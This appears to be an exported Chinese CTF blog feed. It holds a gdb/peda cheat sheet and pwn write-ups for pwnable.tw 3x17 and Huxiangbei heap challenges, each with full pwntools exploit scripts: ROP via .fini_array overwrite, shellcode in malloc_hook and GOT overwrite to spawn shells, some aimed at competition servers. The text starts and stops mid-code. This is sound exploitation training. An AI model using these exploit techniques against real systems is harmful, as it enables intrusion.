class="string">'+'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    write_data(str(system_addr))</span><br><span class="line">write_data(str(binsh_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="http://blog.eonew.cn/archives/1120" target="_blank" rel="noopener">pwnable.tw dubblesort writeup</a></p>
]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb的调试与使用</title>
    <url>/year/01/18/cl7iordpd0028293foyurrjnd/</url>
    <content><![CDATA[<p>少部分包含gdb-peda的特性。。</p>
<p><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="noopener">gdb-peda</a></p>
<a id="more"></a>

<h2 id="1-调试的快捷键"><a href="#1-调试的快捷键" class="headerlink" title="1. 调试的快捷键"></a>1. 调试的快捷键</h2><p>peda带有的功能，直接输入命令，其就会给予提示（如果不是这样，基本上也是该命令就可以不带参数）。这儿就不多做介绍</p>
<h3 id="1-1-基础的调试快捷键"><a href="#1-1-基础的调试快捷键" class="headerlink" title="1.1 基础的调试快捷键"></a>1.1 基础的调试快捷键</h3><ul>
<li><code>s</code> step，si步入</li>
<li><code>n</code> 执行下一条指令 ni步入</li>
<li><code>b</code> 在某处下断点，可以用<ul>
<li><code>b * adrress</code></li>
<li><code>b function_name</code></li>
<li><code>info b</code> 查看断点信息</li>
<li><code>delete 1</code>删除第一个断点</li>
</ul>
</li>
<li><code>c</code> 继续</li>
<li><code>r</code> 执行</li>
<li><code>disas addr</code> 查看addr处前后的反汇编代码</li>
</ul>
<h3 id="1-2-显示数据"><a href="#1-2-显示数据" class="headerlink" title="1.2 显示数据"></a>1.2 显示数据</h3><ul>
<li><code>p</code> 系列<ul>
<li><code>p system/main</code> 显示某个函数地址<ul>
<li><code>p $esp</code> 显示寄存器</li>
</ul>
</li>
<li><code>p/x p/a p/b p/s</code>。。。</li>
<li><code>p 0xff - 0xea</code> 计算器</li>
<li><code>print &amp;VarName</code> 查看变量地址</li>
<li><code>p * 0xffffebac</code> 查看某个地址处的值</li>
</ul>
</li>
<li><code>x</code>系列<ul>
<li><code>x/xw addr</code> 显示某个地址处开始的16进制内容，如果有符号表会加载符号表</li>
<li><code>x/x $esp</code> 查看esp寄存器中的值</li>
<li><code>x/s addr</code> 查看addr处的字符串</li>
<li><code>x/b addr</code> 查看addr处的字符</li>
<li><code>x/i addr</code> 查看addr处的反汇编结果</li>
<li><code>x/ngx addr</code> 显示某个地址处开始的十六进制内容，以八字节位单位显示n个</li>
</ul>
</li>
<li><code>info</code>系列<ul>
<li><code>info register $ebp</code> 查看寄存器ebp中的内容 (简写为 i r ebp)</li>
<li><code>i r eflags</code> 查看状态寄存器</li>
<li><code>i r ss</code> 查看段寄存器</li>
<li><code>i b</code> 查看断点信息</li>
<li><code>i functions</code> 查看所有的函数</li>
</ul>
</li>
<li><code>disas addr</code> 查看addr处前后的反汇编代码</li>
<li><code>stack 20</code> 查看栈内20个值</li>
<li><code>show args</code> 查看参数</li>
<li><code>vmmap</code> 查看映射状况 peda带有</li>
<li><code>readelf</code> 查看elf文件中各个段的起始地址 peda带有</li>
<li><code>parseheap</code> 显示堆状况 peda带有</li>
</ul>
<h3 id="1-3-查找数据"><a href="#1-3-查找数据" class="headerlink" title="1.3 查找数据"></a>1.3 查找数据</h3><ul>
<li><code>find</code> 查找字符串 peda带有</li>
<li><code>searchmem</code> 查找字符串 peda带有</li>
</ul>
<h3 id="1-4-修改数据"><a href="#1-4-修改数据" class="headerlink" title="1.4 修改数据"></a>1.4 修改数据</h3><ul>
<li><code>set $esp=0x110</code> 修改寄存器的值</li>
<li><code>set *0xf7ff3234=0x08042334</code> 修改内存的值</li>
<li><code>set args &quot;asdasg&quot; &quot;afdasgasg&quot; &quot;agasdsa&quot;</code> 分别给参数1,2,3赋值</li>
<li>set args “<code>python -c &#39;print &quot;1234\x7f\xde&quot;&#39;</code>“ 这个参数中用python脚本重写了一下，避免有些字符无法正确设置</li>
<li><code>r &quot;arg1&quot; &quot;arg2&quot; &quot;arg3&quot;</code>设置参数</li>
</ul>
<h2 id="2-查找某个plt、got、plt-2"><a href="#2-查找某个plt、got、plt-2" class="headerlink" title="2. 查找某个plt、got、plt_2"></a>2. 查找某个plt、got、plt_2</h2><ul>
<li>plt 可以直接使用pwntools中的ELF(elf).symbols(function_name)</li>
<li>got 可以直接使用pwntools中的ELF(elf).got(function_name)</li>
<li>plt_2 可以直接使用pwntools中的ELF(lib).symbols(function_name)</li>
</ul>
<h2 id="3-查找程序所动态链接的库"><a href="#3-查找程序所动态链接的库" class="headerlink" title="3. 查找程序所动态链接的库"></a>3. 查找程序所动态链接的库</h2><ul>
<li><p><code>file pwn3</code></p>
<ul>
<li>pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=916959406d0c545f6971223c8e06bff1ed9ae74d, not stripped</li>
</ul>
</li>
<li><p><code>checksec pwn3</code></p>
<ul>
<li>[*] ‘/root/Desktop/Pwnable/fmt/normal/fmt_string_write_got/pwn3’<br>Arch: i386-32-little<br>RELRO: Partial RELRO<br>Stack: No canary found<br>NX: NX enabled<br>PIE: No PIE (0x8048000)</li>
</ul>
</li>
<li><p><code>ldd pwn3</code></p>
<ul>
<li>linux-gate.so.1 (0xf77ad000)<br>libc.so.6 =&gt; /lib32/libc.so.6 (0xf75d2000)<br>/lib/ld-linux.so.2 (0x56601000)</li>
</ul>
</li>
</ul>
<h2 id="4-堆操作"><a href="#4-堆操作" class="headerlink" title="4.堆操作"></a>4.堆操作</h2><ul>
<li><p><code>tracemalloc on</code>跟踪每次malloc</p>
</li>
<li><p><code>parseheap</code> 把堆的布局输出</p>
</li>
<li><p><code>heapinfo</code>展示heap的信息</p>
</li>
</ul>
<h2 id="5-开启和关闭ALSR"><a href="#5-开启和关闭ALSR" class="headerlink" title="5.开启和关闭ALSR"></a>5.开启和关闭ALSR</h2><p>ASLR 的等级可以通过一个内核参数 <strong>randomize_va_space</strong> 来进行控制，查看其值即可知道当前系统的 ASLR 的等级，如下：</p>
<ul>
<li><strong>0：关闭ASLR</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo bash -c <span class="string">"echo 0 &gt; /proc/sys/kernel/randomize_va_space"</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>1：保留的ASLR</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo bash -c <span class="string">"echo 1 &gt; /proc/sys/kernel/randomize_va_space"</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>2：完全的ASLR</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo bash -c <span class="string">"echo 2 &gt; /proc/sys/kernel/randomize_va_space"</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>入门</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable-tw-3x17</title>
    <url>/year/01/02/cl7iordpj002r293fx0r90bdo/</url>
    <content><![CDATA[<p>停课复习了，闲暇时可以刷刷pwn，writeup参考<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/" target="_blank" rel="noopener">和媳妇一起学Pwn 之 3x17</a></p>
<a id="more"></a>

<h2 id="0x01-寻找main函数"><a href="#0x01-寻找main函数" class="headerlink" title="0x01 寻找main函数"></a>0x01 寻找main函数</h2><p>这道题是静态链接，很多函数没有直接给出名称，一开始比较明显的只能定位到start。<br>寻找main函数的话有两种方法：</p>
<h3 id="1-1-查找字符串"><a href="#1-1-查找字符串" class="headerlink" title="1.1 查找字符串"></a>1.1 查找字符串</h3><p>我们可以直接按查找字符串，寻找运行程序时出现的字符串，然后看这个字符串在那个函数里被使用过就可以了。</p>
<p><img src="/02/cl7iordpj002r293fx0r90bdo/1.png" alt></p>
<p>现在找到了addr这个字符串</p>
<p><img src="/02/cl7iordpj002r293fx0r90bdo/2.png" alt></p>
<p>然后点击后面那个函数就可以进入main函数了</p>
<h3 id="1-2-根据start函数的参数"><a href="#1-2-根据start函数的参数" class="headerlink" title="1.2 根据start函数的参数"></a>1.2 根据start函数的参数</h3><p>这个涉及到glibc入口函数的知识，我前面写博客总结过，《程序员的自我修养11章》有比较详细的介绍，总结来说start函数的伪代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _start()</span><br><span class="line">&#123;</span><br><span class="line">    %ebp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> argc = pop from <span class="built_in">stack</span></span><br><span class="line">        <span class="keyword">char</span> ** argv = top of <span class="built_in">stack</span></span><br><span class="line">        _libc_start_main( main, argc, argv, libc_csu_init, libc_csu_fini, edx, top of <span class="built_in">stack</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由此可以判断出此题start函数的基本结构，这样同样可以锁定main函数。</p>
<p><img src="/02/cl7iordpj002r293fx0r90bdo/3.png" alt></p>
<h2 id="0x02-分析程序逻辑"><a href="#0x02-分析程序逻辑" class="headerlink" title="0x02 分析程序逻辑"></a>0x02 分析程序逻辑</h2><p>先上main函数，这里把一眼能看出来的read和write都已经标好，但是有一个<code>sub_3b9330</code>好像看不出来是什么东西，而且点进去之后那个代码<strong>好复杂</strong>，顿时就不想看了。但可以看出来逻辑大概是：</p>
<ul>
<li>读入一个数据</li>
<li>把这个数据转化成一个地址</li>
<li>然后向这个地址里写内容</li>
</ul>
<p><img src="/02/cl7iordpj002r293fx0r90bdo/4.png" alt></p>
<p>所以还是动态调试一下，看看这个看不出功能的函数是什么功能吧</p>
<p>随意输入一个16，然后发现返回值是0x10，看来这个函数是一个把字符串转化成整形的一个函数</p>
<p>程序逻辑就是 一个0x18字节的任意地址写</p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>然而这个程序没有泄露栈地址，所以我也不知道返回地址在什么位置，而且这个程序没有后门函数，只能利用rop或者shellcode，所以0x18个字节的写入完全不够。</p>
<p>其实如果是有经验的大佬可以直接想到利用<code>libc_csu_fini</code>,但是很多时候我们并不清楚这个知识点，难道这题就做不出来了么？（好吧，还真的是做不出来）</p>
<p>但还是要尽量找一下程序里有什么地方是不是可以控制rip，比如下面这部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000402960</span> sub_402960      proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:<span class="number">0000000000402960</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000402960</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000402961</span>                 lea     rax, unk_4B4100</span><br><span class="line">.text:<span class="number">0000000000402968</span>                 lea     rbp, off_4B40F0</span><br><span class="line">.text:<span class="number">000000000040296F</span>                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000402970</span>                 sub     rax, rbp</span><br><span class="line">.text:<span class="number">0000000000402973</span>                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000402977</span>                 sar     rax, <span class="number">3</span></span><br><span class="line">.text:<span class="number">000000000040297B</span>                 jz      short loc_402996</span><br><span class="line">.text:<span class="number">000000000040297</span>D                 lea     rbx, [rax<span class="number">-1</span>]</span><br><span class="line">.text:<span class="number">0000000000402981</span>                 nop     dword ptr [rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">0000000000402988</span></span><br><span class="line">.text:<span class="number">0000000000402988</span> loc_402988:                             ; CODE XREF: sub_402960+<span class="number">34</span>↓j</span><br><span class="line">.text:<span class="number">0000000000402988</span>                 call    qword ptr [rbp+rbx*<span class="number">8</span>+<span class="number">0</span>]</span><br><span class="line">.text:<span class="number">000000000040298</span>C                 sub     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000402990</span>                 cmp     rbx, <span class="number">0F</span>FFFFFFFFFFFFFFFh</span><br><span class="line">.text:<span class="number">0000000000402994</span>                 jnz     short loc_402988</span><br><span class="line">.text:<span class="number">0000000000402996</span></span><br><span class="line">.text:<span class="number">0000000000402996</span> loc_402996:                             ; CODE XREF: sub_402960+<span class="number">1B</span>↑j</span><br><span class="line">.text:<span class="number">0000000000402996</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040299</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040299B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040299</span>C                 jmp     sub_48E32C</span><br><span class="line">.text:<span class="number">000000000040299</span>C ; &#125; <span class="comment">// starts at 402960</span></span><br></pre></td></tr></table></figure>

<h3 id="3-1-libc-csu-fini"><a href="#3-1-libc-csu-fini" class="headerlink" title="3.1 libc_csu_fini"></a>3.1 libc_csu_fini</h3><p>还记的__libc_start_main的几个参数里有两个东西么（init,fini），这俩是个啥呢？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000401</span>A5F                 mov     r8, offset sub_402960</span><br><span class="line">.text:<span class="number">0000000000401</span>A66                 mov     rcx, offset loc_4028D0</span><br></pre></td></tr></table></figure>

<p>这俩其实就是两个函数的地址，分别是：<strong>libc_csu_fini（sub_402960），</strong>libc_csu_init（loc_4028D0），至于为啥init的被IDA识别成loc，就不知道了。因为是静态编译的，这两个本身是libc的函数，但是可以在这个二进制中直接点进去看到函数的实现。</p>
<p>顾名思义，一个是init，开始时函数。一个是fini，结束时的函数。所以可见main函数的地位并没有我们刚接触c语言是那么至高无上，他既不是程序执行时的第一个函数，也不是最后一个函数。</p>
<p>另外在IDA的 view -&gt; open subviews -&gt; segments可以看到如下四个段：</p>
<ul>
<li>.init</li>
<li>.init_array</li>
<li>.fini</li>
<li>.fini_array</li>
</ul>
<p>并且可以看到init和fini都是函数，而init_arry和fini_arry都是数组，所在空间有可读写权限，他们的执行顺序为：</p>
<ul>
<li>__libc_csu_init</li>
<li>main</li>
<li>__libc_csu_fini</li>
</ul>
<p>更精细的执行顺序如下：</p>
<ul>
<li>.init</li>
<li>.init_array[0]</li>
<li>.init_array[1]</li>
<li>…</li>
<li>.init_array[n]</li>
<li>main</li>
<li>.fini_array[n]</li>
<li>…</li>
<li>.fini_array[1]</li>
<li>.fini_array[0]</li>
<li>.fini</li>
</ul>
<p>所以无论是看汇编还是源码，都能看出来，.fini_array数组中的函数是倒着调用的。题目中的off_4B40F0这个地址，就是.fini_array：</p>
<h3 id="3-2-覆写fini-arry"><a href="#3-2-覆写fini-arry" class="headerlink" title="3.2 覆写fini_arry"></a>3.2 覆写fini_arry</h3><p>我们如果把.fini_array[1]覆盖成main，把 .fini_array[0]覆盖成 __libc_csu_fini，这可以样就可以一直循环调用main函数啦！但好像看起来还是无法写多次啊，因为byte_4B9330这个全局变量一直在自增啊，永远比1大呀。观察一下这个变量：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">unsigned</span> __int8)++byte_4B9330</span><br></pre></td></tr></table></figure>

<p>这是8bit的整型，从byte_4B9330这个变量名也能看出来（byte），所以当我们按照如上的方法改写.fini_array段，这个变量会疯狂加一，自增一会就溢出了，然后又会回到1，然后就会停到read系统调用等待写入，就又可以写了。</p>
<h3 id="3-2-栈迁移"><a href="#3-2-栈迁移" class="headerlink" title="3.2 栈迁移"></a>3.2 栈迁移</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000402960</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000402968</span>                 lea     rbp, off_4B40F0 ; fini_array</span><br><span class="line">.text:<span class="number">0000000000402988</span>                 call    qword ptr [rbp+rbx*<span class="number">8</span>+<span class="number">0</span>] ; 调用fini_array的函数</span><br></pre></td></tr></table></figure>

<p>可见在这个函数中rbp之前的值暂时被放到栈里了，然后将rbp当做通用寄存器去存放了一个固定的值0x4b40f0，然后就去调用了fini_array的函数，call之后的指令我们就可控了，我们可以劫持RIP到任何地方。考虑如下情况：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">lea     rbp, off_4B40F0 ; rbp = <span class="number">0x4b40f0</span>            , rsp = 未知</span><br><span class="line"></span><br><span class="line">; 劫持到这</span><br><span class="line">mov     rsp,rbp         ; rbp = <span class="number">0x4b40f0</span>            , rsp = <span class="number">0x4b40f0</span></span><br><span class="line">pop     rbp             ; rbp = [rsp] = [<span class="number">0x4b40f0</span>]  , rsp = <span class="number">0x4b40f8</span></span><br><span class="line">ret                     ; rip = [rsp] = [<span class="number">0x4b40f8</span>]  , rsp = <span class="number">0x4b4100</span></span><br></pre></td></tr></table></figure>

<p>则rsp被劫持到0x4b4100，rip和rbp分别为.fini_array[1]和.fini_array[0]的内容</p>
<p>则我们可以在0x4b4100的地址向上布置rop链，只要rip指向的位置的代码不会破坏高地址栈结构，然后还有个ret指令，那么就可以实现ROP啦。所以我们要完成三件事：</p>
<ol>
<li>布置好从0x4b4100开始的栈空间(利用任意地址写)</li>
<li>保证.fini_array[1]指向的代码不破坏栈结构，还有个ret，或者直接就一句ret也行</li>
<li>通过上文类似的方法劫持rsp到0x4b4100，即可触发ROP</li>
</ol>
<h3 id="3-3-exp"><a href="#3-3-exp" class="headerlink" title="3.3 exp"></a>3.3 exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">myelf = ELF(<span class="string">"./3x17"</span>)</span><br><span class="line"><span class="comment">#io = process(myelf.path)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,"b * 0x471db5")</span></span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line">rop_syscall = <span class="number">0x471db5</span></span><br><span class="line">rop_pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">rop_pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">rop_pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">rop_pop_rdi = <span class="number">0x401696</span></span><br><span class="line">bin_sh_addr = <span class="number">0x4B419A</span></span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line"></span><br><span class="line">esp = <span class="number">0x4B4100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">	io.recv()</span><br><span class="line">	io.send(str(addr))</span><br><span class="line">	io.recv()</span><br><span class="line">	io.send(data)</span><br><span class="line"></span><br><span class="line">write(fini_array,p64(libc_csu_fini)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">write(bin_sh_addr,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">write(esp,p64(rop_pop_rax))</span><br><span class="line">write(esp+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">write(esp+<span class="number">16</span>,p64(rop_pop_rdi))</span><br><span class="line">write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(esp+<span class="number">32</span>,p64(rop_pop_rdx))</span><br><span class="line">write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">48</span>,p64(rop_pop_rsi))</span><br><span class="line">write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">64</span>,p64(rop_syscall))</span><br><span class="line">write(fini_array,p64(leave_ret))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这道题设计的很巧妙：</p>
<ul>
<li>最开始时只有一次任意地址写，通过修改.fini_array段，利用__libc_csu_fini函数性质构造循环调用main函数，并溢出检查字段绕，变成多次任意地址写</li>
<li>继续利用任意地址写和__libc_csu_fini函数性质，迁移rsp，并劫持rip，完成ROP</li>
</ul>
<p>这道题给我带来的新思路和收获</p>
<ul>
<li>碰到复杂函数不必急于看代码，可以先动态调试一下，猜测它的功能</li>
<li>巩固了程序入口函数的知识</li>
<li>寻找利用途径时可以多关注可以控制程序ip的地方</li>
<li>可以想办法让一次任意地址读变为多次任意地址读</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>湖湘杯复赛题目-writeup</title>
    <url>/year/11/13/cl7iordqn005p293fwbvyjfb7/</url>
    <content><![CDATA[<p>还是要多刷多复现堆题啊</p>
<h2 id="0x01-HackNodte"><a href="#0x01-HackNodte" class="headerlink" title="0x01 HackNodte"></a>0x01 HackNodte</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这道题是静态链接，修改时用的是<code>strlen</code>,造成了<code>off-by-one</code>，所以堆重叠。然后把<code>chunk</code>分配到<code>main_arena</code>上，再修改<code>unsortedbin</code>,分配到<code>malloc_hook</code>上</p>
<a id="more"></a>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./HackNote'</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">'b*0x400BFD'</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = <span class="number">0x6CB788</span></span><br><span class="line">free_hook = <span class="number">0x6CD5E8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'-----------------\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">':\n'</span>,str(size))</span><br><span class="line">    sh.sendafter(<span class="string">':\n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'-----------------\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">':\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'-----------------\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">':\n'</span>,str(idx))</span><br><span class="line">    sh.sendafter(<span class="string">':\n'</span>,content)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch = <span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">"a\n"</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x220</span>, <span class="string">"b"</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x200</span>) + <span class="string">"\n"</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"c\n"</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'d\n'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x108</span>*<span class="string">'a'</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x108</span>*<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe0</span>,<span class="string">'a\n'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'b\n'</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'c\n'</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x330</span>,<span class="string">'a\n'</span>)  <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'e'</span>*<span class="number">0xe8</span> + p64(<span class="number">0x60</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">10</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6cb820</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'c\n'</span>) <span class="comment">#4   向main_arena中写入0x71</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'d\n'</span>) <span class="comment">#5    </span></span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x6CB788</span> - <span class="number">0x10</span>) + <span class="string">"\n"</span> )<span class="comment">#5   分配到main_arena并修改unsortedbin</span></span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0x6cb790</span>) + asm(shellcraft.sh()) + <span class="string">"\n"</span>)<span class="comment">#5 向malloc_hook中写入shellcode</span></span><br><span class="line">sh.sendlineafter(<span class="string">'-----------------\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">':\n'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x02-NameSystem"><a href="#0x02-NameSystem" class="headerlink" title="0x02 NameSystem"></a>0x02 NameSystem</h2><p>这道题有个<code>uaf</code>一开始还真没看出来。。。。先把<code>bss</code>段上的一个堆指针改成<code>got</code>表上的内容，再把<code>free的got表</code>内容改成<code>puts@plt</code>，从而可以泄露<code>libc</code>，最后再把<code>free@got</code>改成<code>system</code>，然后执行就可以获得shell。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Name Size:"</span>, str(size))</span><br><span class="line">    r.sendlineafter(<span class="string">"Name:"</span>, content)</span><br><span class="line">    r.recvuntil(<span class="string">"Your choice :\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"The id you want to delete:"</span>, str(index))</span><br><span class="line">    r.recvuntil(<span class="string">"Your choice :\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("./NameSystem")</span></span><br><span class="line">r = remote(<span class="string">"183.129.189.62"</span>, <span class="string">"15505"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Your choice :\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"a"</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">18</span>)</span><br><span class="line">dele(<span class="number">17</span>)</span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">"a"</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">18</span>)</span><br><span class="line">dele(<span class="number">17</span>)</span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"a"</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">18</span>)</span><br><span class="line">dele(<span class="number">17</span>)</span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0x60208d</span>))</span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"\x00"</span> * <span class="number">3</span> + p64(<span class="number">0x602060</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>, p64(<span class="number">0x601ffa</span>))</span><br><span 